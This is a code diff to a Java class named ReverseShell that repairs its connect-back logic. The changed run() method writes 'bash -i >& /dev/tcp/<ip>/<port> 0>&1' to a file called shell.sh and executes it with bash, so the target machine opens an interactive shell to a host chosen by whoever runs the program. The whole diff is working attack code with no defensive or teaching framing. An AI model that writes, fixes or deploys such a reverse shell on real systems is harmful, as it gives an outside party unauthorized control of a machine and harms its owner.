@@ -10,14 +10,21 @@ public class ReverseShell{
 		this.rmt = connectBackIP;
 	}
 
-	public void run() throws IOException{
+	public void run() throws IOException, InterruptedException{
+		String cmd = "bash -i >& /dev/tcp/"+this.rmt+"/"+String.valueOf(this.port)+" 0>&1";
+		try {
+      		FileWriter myObj = new FileWriter("shell.sh");
+      		myObj.write(cmd);
+      		myObj.close();
+	    } catch (IOException e) {
+	    	System.out.println("An error occurred.");
+	      	e.printStackTrace();
+	    }
 		System.out.println("Connecting back to " + rmt);
 		Runtime r = Runtime.getRuntime();
-		String cmd = "bash -i >& /dev/tcp/" + this.rmt+"/" + String.valueOf(this.port)+" 0>&1'";
-		Process p = r.exec(cmd);
-		try{p.waitFor();
-		}catch(InterruptedException e){e.printStackTrace();}
-		
+		Process p = r.exec("bash shell.sh");
+		p.waitFor();
+
 	}
 
 	public static void main(String args[]){
@@ -27,7 +34,7 @@ public class ReverseShell{
 			ReverseShell r = new ReverseShell(args[0]);
 			try{r.run();}
 			catch(IOException e){e.printStackTrace();}
-			
+			catch(InterruptedException e){e.printStackTrace();}
 		}
 	}
 }
